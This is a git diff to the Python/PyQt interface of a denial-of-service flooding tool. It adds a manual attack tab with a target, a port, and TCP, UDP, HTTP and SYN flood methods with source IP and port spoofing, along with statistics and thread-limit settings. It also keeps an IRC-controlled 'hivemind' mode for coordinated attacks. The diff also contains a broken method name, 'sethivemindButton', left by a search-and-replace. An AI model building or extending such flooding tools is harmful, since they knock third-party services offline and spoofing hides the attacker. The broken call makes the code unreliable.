@@ -8,10 +8,10 @@ from Core.IRC import *
 from Core.Flooder import *
 from Core.Globals import *
 
-class defaultTab(QWidget):
+class hivemindTab(QWidget):
 
-    def __init__(self, parent=None):
-        QWidget.__init__(self, parent)
+    def __init__(self):
+        QWidget.__init__(self)
 
         self.server = QLineEdit("irc.hiddenaces.net")
         self.port = QLineEdit("6667")
@@ -37,10 +37,113 @@ class defaultTab(QWidget):
         self.setMinimumSize(200, 200)
         self.show()
 
+class manualTab(QWidget):
+
+    def __init__(self):
+        QWidget.__init__(self)
+
+        self.target = QLineEdit("")
+        self.port = QLineEdit("")
+        self.port.setValidator(QIntValidator())
+        self.message = QLineEdit("U dun goofed")
+        self.srchost = QLineEdit("192.168.0.1")
+        self.srcport = QLineEdit("12945")
+
+        self.tcpMethod = QCheckBox("tcp")
+        self.udpMethod = QCheckBox("udp")
+        self.httpMethod = QCheckBox("http")
+        self.synMethod = QCheckBox("syn(linux only)")
+
+        self.start = QPushButton("start")
+
+        layout = QGridLayout()
+
+        layout.addWidget(QLabel("target:"), 0, 0)
+        layout.addWidget(self.target, 0, 1)
+
+        layout.addWidget(QLabel("port:"), 1, 0)
+        layout.addWidget(self.port, 1, 1)
+
+        layout.addWidget(QLabel("message:"), 2, 0)
+        layout.addWidget(self.message, 2, 1)
+
+        layout.addWidget(QLabel("SYN IP Spoof:"), 3, 0)
+        layout.addWidget(self.srchost, 3, 1)
+
+        layout.addWidget(QLabel("SYN port Spoof:"), 4, 0)
+        layout.addWidget(self.srcport, 4, 1)
+
+        wrapWidget = QWidget()
+        wrapLayout = QGridLayout()
+
+        wrapLayout.addWidget(self.tcpMethod, 0, 0)
+        wrapLayout.addWidget(self.udpMethod, 0, 1)
+        wrapLayout.addWidget(self.httpMethod, 0, 2)
+        wrapLayout.addWidget(self.synMethod, 0, 3)
+
+        wrapWidget.setLayout(wrapLayout)
+
+        layout.addWidget(QLabel("methods:"), 5, 0)
+        layout.addWidget(wrapWidget, 5, 1)
+
+        layout.addWidget(self.start, 6, 0, 1, 2)
+
+        self.setLayout(layout)
+        self.setMinimumSize(200, 200)
+        self.show()
+
+class statisticsTab(QWidget):
+
+    def __init__(self, main):
+        QWidget.__init__(self)
+
+        self.main = main
+        self.byteCount = QLabel("0")
+        self.threadCount = QLabel("0")
+        self.updateTimer = QTimer()
+        self.updateTimer.timeout.connect(self.updateStats)
+
+        layout = QGridLayout()
+
+        layout.addWidget(QLabel("bytes send:"), 0, 0)
+        layout.addWidget(self.byteCount, 0, 1)
+
+        layout.addWidget(QLabel("number of threads:"), 1, 0)
+        layout.addWidget(self.threadCount, 1, 1)
+
+        self.setLayout(layout)
+        self.setMinimumSize(200, 200)
+        self.updateTimer.start(500)
+        self.show()
+
+    def updateStats(self):
+        if self.main.flooder != None:
+            self.byteCount.setText(str(self.main.flooder.byteCount.value))
+            self.threadCount.setText(str(self.main.flooder.processNumber()))
+
+class settingsTab(QWidget):
+
+    def __init__(self):
+        QWidget.__init__(self)
+
+        self.maxThreads = QLineEdit("15")
+        self.maxThreads.setValidator(QIntValidator())
+        self.overrideThreads = QCheckBox("Force")
+
+        layout = QGridLayout()
+
+        layout.addWidget(QLabel("Maximum thread amount:"), 0, 0)
+        layout.addWidget(self.maxThreads, 0, 1)
+        layout.addWidget(self.overrideThreads, 0, 2)
+
+        self.setLayout(layout)
+        self.setMinimumSize(200, 200)
+        self.show()
+
 class main(QMainWindow):
 
-    def __init__(self, parent=None):
-        QMainWindow.__init__(self, parent)
+    def __init__(self):
+        QMainWindow.__init__(self)
 
         self.irc = None
         self.flooder = None
@@ -70,10 +173,17 @@ class main(QMainWindow):
         getEventManager().start()
 
         self.tabWidget = QTabWidget()
-        self.defTab = defaultTab()
-        self.tabWidget.addTab(self.defTab, "default")
+        self.defTab = hivemindTab()
+        self.manTab = manualTab()
+        self.statTab = statisticsTab(self)
+        self.settTab = settingsTab()
+        self.tabWidget.addTab(self.defTab, "Hivemind")
+        self.tabWidget.addTab(self.manTab, "Manual")
+        self.tabWidget.addTab(self.statTab, "Statistics")
+        self.tabWidget.addTab(self.settTab, "Settings")
 
         self.defTab.start.clicked.connect(self.hivemindStart)
+        self.manTab.start.clicked.connect(self.manualStart)
 
         self.setCentralWidget(self.tabWidget)
 
@@ -93,7 +203,7 @@ class main(QMainWindow):
             else:
                 msgBox.setInformativeText("Do you want to change server?")
             msgBox.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
-            msgBox.setDefaultButton(QMessageBox.Cancel)
+            msgBox.sethivemindButton(QMessageBox.Cancel)
             ret = msgBox.exec_()
 
             if ret == QMessageBox.Cancel:
@@ -115,6 +225,43 @@ class main(QMainWindow):
 
         if self.irc == None:
             self.irc = IRC(self.server, self.port, self.channel)
+
+    def manualStart(self):
+        tab = self.manTab
+
+        if self.flooder != None:
+            msgBox = QMessageBox();
+            msgBox.setText("Hivemind is already running.")
+            msgBox.setInformativeText("Do you want to start anyway")
+            msgBox.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
+            msgBox.sethivemindButton(QMessageBox.Cancel)
+            ret = msgBox.exec_()
+
+            if ret == QMessageBox.Cancel:
+                return
+
+            self.flooder.stop()
+
+        self.targetip = socket.gethostbyname(str(tab.target.text()))
+        self.port = int(tab.port.text())
+        self.message = str(tab.message.text())
+        self.method = []
+        self.threads = int(self.settTab.maxThreads.text())
+        if tab.tcpMethod.isChecked():
+            self.method.append(TCP_METHOD)
+        if tab.udpMethod.isChecked():
+            self.method.append(UDP_METHOD)
+        if tab.httpMethod.isChecked():
+            self.method.append(HTTP_METHOD)
+        if tab.synMethod.isChecked():
+            self.method.append(SYN_METHOD)
+        self.random = False
+        self.wait = True
+        self.srchost = str(tab.srchost.text())
+        self.srcport = int(tab.srcport.text())
+
+        self.flooder = Flooder(self.targetip, self.port, self.timeout, self.method, self.threads, self.subsite, self.message, self.random, self.wait, self.srchost, self.srcport)
+        self.flooder.start()
 
     def lazerParseHook(self, event):
         s = []
@@ -173,8 +320,8 @@ class main(QMainWindow):
             elif s[x] == "threads":
                 if s[x+1].isdigit():
                     threads = int(s[x+1])
-                    if threads > 100:
-                        self.threads = 100
+                    if threads > int(self.settTab.maxThreads.text()) or self.settTab.overrideThreads.isChecked():
+                        self.threads = int(self.settTab.maxThreads.text())
                     elif threads < 1:
                         self.threads = 1
                     else:
